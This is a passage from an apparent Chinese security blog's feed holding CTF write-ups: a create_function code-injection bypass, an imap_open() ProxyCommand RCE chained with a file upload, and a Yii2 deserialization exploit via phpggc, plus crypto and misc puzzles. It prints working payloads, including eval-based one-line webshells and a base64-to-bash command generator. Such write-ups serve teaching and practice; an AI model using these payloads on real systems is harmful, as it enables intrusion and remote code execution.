class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以很直观的看出对比，以及<code>\</code>的用法</p><h2 id="getshell函数寻找"><a href="#getshell函数寻找" class="headerlink" title="getshell函数寻找"></a>getshell函数寻找</h2><p>那么既然现在我们找到了利用<code>\</code>进行正则bypass的方法，则需要找一个合适的getshell / readfile函数<br>这里注意到参数的构造方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action(<span class="string">''</span>, $arg);</span><br></pre></td></tr></table></figure></p><p>很显然，需要一个可以输入至少2个参数的函数，同时第二个参数存在RCE的风险<br>这里可以简单翻阅我之前写的<code>PHP Command / Code Injection Summary</code><br>链接如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2018/03/09/php-command%20or%20code-injection-summary/</span><br></pre></td></tr></table></figure></p><p>不难找到如下函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function ( string $args , string $code )</span><br></pre></td></tr></table></figure></p><p>通过官方样例<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">'$a,$b'</span>, <span class="string">'return "ln($a) + ln($b) = " . log($a * $b);'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"New anonymous function: $newfunc\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们可以得到<code>create_function()</code>这样的原型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a,$b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"ln($a) + ln($b) = "</span> . log($a * $b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>第一个参数控制函数的变量名，第二个参数控制函数内的代码<br>那么我们这里<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action(<span class="string">''</span>, $arg);</span><br></pre></td></tr></table></figure></p><p>可以说很容易进行代码注入拼接达到bypass，例如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$arg = <span class="keyword">return</span> <span class="string">"2333"</span>;&#125;phpinfo();<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><p>我们不妨带入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a,$b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"2333"</span>;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="comment">/*&#125;</span></span><br></pre></td></tr></table></figure></p><p>可以发现，这样即可进行RCE，我们测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:22000/?action=%5ccreate_function&amp;arg=return &quot;2333&quot;;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-03-21-17-04.png" alt=""><br>发现成功执行了phpinfo</p><h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>那么我们插入一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$arg = <span class="keyword">return</span> <span class="string">"2333"</span>;&#125;<span class="keyword">eval</span>($_REQUEST[<span class="string">'sky'</span>]);<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=return &quot;2333&quot;;&#125;eval($_REQUEST[&apos;sky&apos;]);/*&amp;sky=system(&apos;ls&apos;);</span><br></pre></td></tr></table></figure></p><p>但是得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: system() has been disabled for security reasons in /var/www/html/index.php(8) : runtime-created function(1) : eval()&apos;d code on line 1</span><br></pre></td></tr></table></figure></p><p>那么我们更改命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sky=var_dump(scandir(&apos;./&apos;));</span><br></pre></td></tr></table></figure></p><p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>我们继续查看上层目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sky=var_dump(scandir(&apos;../&apos;));</span><br></pre></td></tr></table></figure></p><p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(31) &quot;flag_h0w2execute_arb1trary_c0de&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>至此，我们成功getflag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_h0w2execute_arb1trary_c0de</span><br></pre></td></tr></table></figure></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本地考察的难点应该在于字符fuzz，用<code>\</code>打头bypass过滤提供了一个不错的思路，在日后的bypass上，不妨进行相应的测试~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于合天智汇</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Code Breaking是ph牛搭建的代码审计挑战赛：&lt;a href=&quot;https://code-breaking.com&quot; target
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>从一道题看imap_open() rce</title>
    <link href="http://skysec.top/2019/02/25/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8Bimap_open()%20RCE/"/>
    <id>http://skysec.top/2019/02/25/从一道题看imap_open() RCE/</id>
    <published>2019-02-25T08:32:19.000Z</published>
    <updated>2019-02-26T07:56:20.859Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本题为2019安恒2月月赛的my email，从漏洞点发现到getshell还是有点意思的，以下是记录</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到题目先看一遍功能，发现存在注册和登录功能<br><img src="/images/2019-02-25-16-45-53.png" alt=""><br>随便注册个账号，登入，得到信息<br><img src="/images/2019-02-25-16-46-21.png" alt=""><br>发现还有完善信息页面<br><img src="/images/2019-02-25-16-46-41.png" alt=""><br>看样子需要邮箱授权，我们随便测试一下<br><img src="/images/2019-02-25-16-47-27.png" alt=""><br>虽然提示我授权失败，但是来到主页，已经完善信息完成<br><img src="/images/2019-02-25-16-48-01.png" alt=""><br>发现增加功能：更换背景<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10014/user/upload.php</span><br></pre></td></tr></table></figure></p><p>发现是文件上传功能<br>我们测试一下，随意上传一个图片，查看一下源代码，发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">    background-image: url(./user/skysky.jpg);</span><br><span class="line">    background-size: 100%,100%;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得到上传路径与命名规则<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dir = <span class="string">'./user/'</span>.$username.<span class="string">'.jpg'</span>;</span><br></pre></td></tr></table></figure></p><p>不难发现，最后保存路径存在可控点$username，我们进行二次注入探测<br>注册用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skysky.php%00</span><br></pre></td></tr></table></figure></p><p>登入后发现用户名变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skysky.php\0</span><br></pre></td></tr></table></figure></p><p>猜测应该注册处存在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes($username)</span><br></pre></td></tr></table></figure></p><p>那么应该很难使用$username去上传shell</p><h2 id="攻击点思考"><a href="#攻击点思考" class="headerlink" title="攻击点思考"></a>攻击点思考</h2><p>目前来看，情况僵硬，必须思考一下如何串联上述功能进行攻击了<br>既然不是直接upload+register进行getshell，那么势必需要用到邮件功能<br>不妨google一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php+mail+rce</span><br></pre></td></tr></table></figure></p><p>发现如下两个函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP mail()</span><br><span class="line">PHP imap_open()</span><br></pre></td></tr></table></figure></p><p>为进一步确定方向和攻击点，我们看一下邮箱处需要的参数<br><img src="/images/2019-02-25-17-10-51.png" alt=""><br>我们再看上述3种和邮件有关的RCE<br>首先是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP mail()</span><br></pre></td></tr></table></figure></p><p>我们知道其参数为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool mail(</span><br><span class="line">    string $to,</span><br><span class="line">    string $subject,</span><br><span class="line">    string $message [,</span><br><span class="line">    string $additional_headers [,</span><br><span class="line">    string $additional_parameters ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>这里的界面应该类似于写邮件，例如<br><img src="/images/2019-02-25-18-15-22.png" alt=""><br>而漏洞点即在于mail函数的第五个参数没有正确过滤，我们可以通过如下方式进行RCE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">email=</span><br><span class="line">-sky@skysec.top -OqueueDirectory=/ -Xskyskysky.php</span><br><span class="line">title=</span><br><span class="line">&lt;?php eval($_GET[sky]);?&gt;</span><br></pre></td></tr></table></figure></p><p>而这里我们的参数为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email，sign，server</span><br></pre></td></tr></table></figure></p><p>功能为邮箱授权，感觉有些对不上号，我们再看看<code>imap_open()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imap_open ( string $mailbox , string $username , string $password [, int $options = <span class="number">0</span> [, int $n_retries = <span class="number">0</span> [, <span class="keyword">array</span> $params = <span class="keyword">NULL</span> ]]] ) : resource</span><br></pre></td></tr></table></figure></p><p>漏洞点在于第一个参数<code>$mailbox</code><br>详细解析可见<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable-functions-in-php-installations-6ccdbf4f52bb</span><br></pre></td></tr></table></figure></p><h2 id="imap-open-攻击测试"><a href="#imap-open-攻击测试" class="headerlink" title="imap_open()攻击测试"></a>imap_open()攻击测试</h2><p>于是综上所述，我们将目光放在imap_open()上开始测试，我们可利用如下脚本生成payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = $argv[<span class="number">1</span>];</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = “any -o ProxyCommand=<span class="keyword">echo</span>\t”.$encoded_payload.”|base64\t-d|bash&#125;”;</span><br><span class="line"><span class="keyword">print</span>(“payload: &#123;$server&#125;”.PHP_EOL);</span><br></pre></td></tr></table></figure></p><p>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">any -o ProxyCommand=echo\tbHM=|base64\t-d|bash&#125;</span><br></pre></td></tr></table></figure></p><p>我们测试一下，由于imap_open是php的扩展模块，我们这里选择找个docker测试<br>随便搜一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search imap</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-25-18-47-22.png" alt=""><br>选择一个后pull<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull fedosov/docker-php-imap-composer</span><br></pre></td></tr></table></figure></p><p>进入容器进行测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd fedosov/docker-php-imap-composer /bin/bash</span><br><span class="line">docker attach id</span><br></pre></td></tr></table></figure></p><p>先写一个带有imap_open的1.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"echo skysky|tee /tmp/success"</span>;</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="string">"|base64\t-d|bash"</span>;</span><br><span class="line">@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-25-18-50-04.png" alt=""><br>我们可以明显看到，运行前tmp目录为空目录，运行后，tmp目录生成了success文件，文件内容为我们指定的skysky<br>这样一来攻击点就清晰了：利用邮箱授权功能往<code>./user/</code>目录写入shell即可<br>注：为什么不执行命令呢？因为这里命令不回显……写shell的话要方便很多</p><h2 id="题目攻击点测试"><a href="#题目攻击点测试" class="headerlink" title="题目攻击点测试"></a>题目攻击点测试</h2><p>生成payload脚本为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"echo '&lt;?php phpinfo();' &gt; /var/www/html/user/sky.php"</span>;</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="string">"|base64\t-d|bash"</span>;</span><br><span class="line"><span class="keyword">echo</span> $server;</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">any -o ProxyCommand=echo\tZWNobyAnPD9waHAgcGhwaW5mbygpOycgPiAvdmFyL3d3dy9odG1sL3VzZXIvc2t5LnBocA==|base64\t-d|bash</span><br></pre></td></tr></table></figure></p><p>我们测试一下<br><img src="/images/2019-02-25-18-55-28.png" alt=""><br>发现参数不被允许提醒，此时猜测是不是存在过滤，我们测试一下<br><img src="/images/2019-02-25-18-55-59.png" alt=""><br><img src="/images/2019-02-25-18-57-02.png" alt=""><br><img src="/images/2019-02-25-18-57-24.png" alt=""><br>发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64,|,\</span><br></pre></td></tr></table></figure></p><p>均被过滤，那么既然如此，该如何进行任意文件写入呢？</p><h2 id="upload助攻"><a href="#upload助攻" class="headerlink" title="upload助攻"></a>upload助攻</h2><p>此时不难想起，之前还有一个上传功能，路径如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dir = <span class="string">'./user/'</span>.$username.<span class="string">'.jpg'</span>;</span><br></pre></td></tr></table></figure></p><p>我们是已知文件名和路径的，那么能否在文件内容做文章，进行运用？<br>这里不难想到，可以直接使用<code>bash filename</code><br>例如<br><img src="/images/2019-02-25-19-02-25.png" alt=""><br>那么我们只需要构造文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;echo &quot;&lt;?php phpinfo();&quot;&gt; skysky.php&apos; &gt; skysky.jpg</span><br></pre></td></tr></table></figure></p><p>然后上传skysky.jpg，再利用imap_open() RCE即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">any -o ProxyCommand=bash skysky.jpg&#125;</span><br></pre></td></tr></table></figure></p><p>我们测试一下<br><img src="/images/2019-02-25-19-09-54.png" alt=""><br><img src="/images/2019-02-25-19-16-58.png" alt=""><br><img src="/images/2019-02-25-19-17-26.png" alt=""><br>发现成功执行phpinfo()</p><h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>那么故技重施，即可getshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;echo &quot;&lt;?php eval(\$_REQUEST[sky]);&quot;&gt; skysky.php&apos; &gt; skysky.jpg</span><br><span class="line">any -o ProxyCommand=bash skysky.jpg&#125;</span><br></pre></td></tr></table></figure></p><p>菜刀连上，即可getshell<br><img src="/images/2019-02-25-19-19-11.png" alt=""><br><img src="/images/2019-02-25-19-19-21.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这道题目再一次说明了思路很重要，如果思路不明确，尝试注入，upload等则很容易被这道题目带入误区XD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/171707</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本题为2019安恒2月月赛的my email，从漏洞点发现到getshell还是有点意思的，以下是记录&lt;/p&gt;
&lt;h2 id=&quot;信息搜集&quot;&gt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019安恒杯-2月月赛Writeup</title>
    <link href="http://skysec.top/2019/02/24/2019%E5%AE%89%E6%81%92%E6%9D%AF-2%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>http://skysec.top/2019/02/24/2019安恒杯-2月月赛Writeup/</id>
    <published>2019-02-24T01:46:41.000Z</published>
    <updated>2019-02-28T04:48:03.583Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末叕刷了安恒月赛，以下是Web&amp;Crypto&amp;Misc题解记录</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="babycms"><a href="#babycms" class="headerlink" title="babycms"></a>babycms</h3><p>打开题目，发现是Yii2框架写的平台，首先进行信息搜集，得到源码泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101.71.29.5:10015/web.zip</span><br></pre></td></tr></table></figure></p><p>审计代码，发现<code>/views/medicine/view.php</code>存在反序列化操作<br><img src="/images/2019-02-24-14-43-01.png" alt=""><br>寻找可利用类，查看composer.json，发现存在RCE漏洞组件<br><img src="/images/2019-02-24-14-46-10.png" alt=""><br>利用phpggc，可以看到有对应版本的攻击<br><img src="/images/2019-02-24-14-19-46.png" alt=""><br>查看文件运行路径<br><img src="/images/2019-02-24-14-53-23.png" alt=""><br><img src="/images/2019-02-24-18-57-48.png" alt=""><br>尝试文件目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/runtime</span><br></pre></td></tr></table></figure></p><p>直接使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc SwiftMailer/FW3 /var/www/html/runtime/sky.php ~/Desktop/sky.php -b</span><br></pre></td></tr></table></figure></p><p>得到payload<br><img src="/images/2019-02-24-14-54-07.png" alt=""><br>同时发现登录密码<br><img src="/images/2019-02-24-19-12-10.png" alt=""><br>登入后，即可使用payload getshell拿到flag</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="来玩个游戏吧"><a href="#来玩个游戏吧" class="headerlink" title="来玩个游戏吧"></a>来玩个游戏吧</h3><p><img src="/images/2019-02-24-10-34-55.png" alt=""><br>第一关一看就知道是盲文加密<br><img src="/images/2019-02-24-14-03-08.png" alt=""><br>使用在线网站解密<br><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⠏⠏⠄⠁⠄⠀⠂⡑⡒⡓⠄⡒⠂⡑⠇⠆⡒⠉⠇⠁⠉⡔⠉⠁⠁⠀⠁⠇⡓⠅⠉⠂=</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??41402abc4b2a76b9719d911017c592</span><br></pre></td></tr></table></figure></p><p>发现是开头未知2位的md5，扔到百度去<br><img src="/images/2019-02-24-14-06-48.png" alt=""><br>发现是hello，提交通过第一关，第二关是一个md5碰撞，我们使用github的项目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gen_coll_test.py</span><br></pre></td></tr></table></figure></p><p>得到几百个相同md5的文件，随便挑选两个<br><img src="/images/2019-02-24-14-10-18.png" alt=""><br><img src="/images/2019-02-24-14-11-11.png" alt=""><br>得到最后一步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Dear Professional ; Especially for you - this cutting-edge </span><br><span class="line">intelligence ! If you no longer wish to receive our </span><br><span class="line">publications simply reply with a Subject: of &quot;REMOVE&quot; </span><br><span class="line">and you will immediately be removed from our club . </span><br><span class="line">This mail is being sent in compliance with Senate bill </span><br><span class="line">2216 , Title 9 ; Section 306 ! THIS IS NOT MULTI-LEVEL </span><br><span class="line">MARKETING . Why work for somebody else when you can </span><br><span class="line">become rich as few as 35 weeks . Have you ever noticed </span><br><span class="line">more people than ever are surfing the web and people </span><br><span class="line">will do almost anything to avoid mailing their bills </span><br><span class="line">. Well, now is your chance to capitalize on this ! </span><br><span class="line">WE will help YOU decrease perceived waiting time by </span><br><span class="line">120% &amp; decrease perceived waiting time by 140% . You </span><br><span class="line">can begin at absolutely no cost to you . But don&apos;t </span><br><span class="line">believe us ! Mrs Jones of Minnesota tried us and says </span><br><span class="line">&quot;I was skeptical but it worked for me&quot; . We assure </span><br><span class="line">you that we operate within all applicable laws . Because </span><br><span class="line">the Internet operates on &quot;Internet time&quot; you must act </span><br><span class="line">now ! Sign up a friend and your friend will be rich </span><br><span class="line">too . Warmest regards . Dear Cybercitizen , We know </span><br><span class="line">you are interested in receiving red-hot announcement </span><br><span class="line">! We will comply with all removal requests ! This mail </span><br><span class="line">is being sent in compliance with Senate bill 1619 ; </span><br><span class="line">Title 2 ; Section 301 . This is NOT unsolicited bulk </span><br><span class="line">mail ! Why work for somebody else when you can become </span><br><span class="line">rich within 53 MONTHS ! Have you ever noticed more </span><br><span class="line">people than ever are surfing the web and more people </span><br><span class="line">than ever are surfing the web . Well, now is your chance </span><br><span class="line">to capitalize on this . We will help you use credit </span><br><span class="line">cards on your website plus decrease perceived waiting </span><br><span class="line">time by 150% . The best thing about our system is that </span><br><span class="line">it is absolutely risk free for you ! But don&apos;t believe </span><br><span class="line">us ! Mrs Simpson of Washington tried us and says &quot;Now </span><br><span class="line">I&apos;m rich, Rich, RICH&quot; . We assure you that we operate </span><br><span class="line">within all applicable laws ! We beseech you - act now </span><br><span class="line">! Sign up a friend and your friend will be rich too </span><br><span class="line">. Thank-you for your serious consideration of our offer </span><br><span class="line">! Dear Friend ; This letter was specially selected </span><br><span class="line">to be sent to you ! If you no longer wish to receive </span><br><span class="line">our publications simply reply with a Subject: of &quot;REMOVE&quot; </span><br><span class="line">and you will immediately be removed from our mailing </span><br><span class="line">list . This mail is being sent in compliance with Senate </span><br><span class="line">bill 2716 , Title 2 ; Section 306 ! This is a ligitimate </span><br><span class="line">business proposal . Why work for somebody else when </span><br><span class="line">you can become rich inside 33 weeks . Have you ever </span><br><span class="line">noticed more people than ever are surfing the web plus </span><br><span class="line">more people than ever are surfing the web . Well, now </span><br><span class="line">is your chance to capitalize on this ! WE will help </span><br><span class="line">YOU SELL MORE and process your orders within seconds </span><br><span class="line">. You can begin at absolutely no cost to you . But </span><br><span class="line">don&apos;t believe us ! Mrs Jones of Kentucky tried us and </span><br><span class="line">says &quot;I was skeptical but it worked for me&quot; ! This </span><br><span class="line">offer is 100% legal ! We implore you - act now . Sign </span><br><span class="line">up a friend and you&apos;ll get a discount of 50% . God </span><br><span class="line">Bless .</span><br></pre></td></tr></table></figure></p><p>根据题目描述信息，google一下”垃圾邮件+栅格密码”，得到解密网站<a href="http://www.spammimic.com/decode.shtml进行解密得到" target="_blank" rel="noopener">http://www.spammimic.com/decode.shtml进行解密得到</a><br><img src="/images/2019-02-24-14-13-58.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a0dd1e2e6b87fe47e5ad0184dc291e04&#125;</span><br></pre></td></tr></table></figure></p><h3 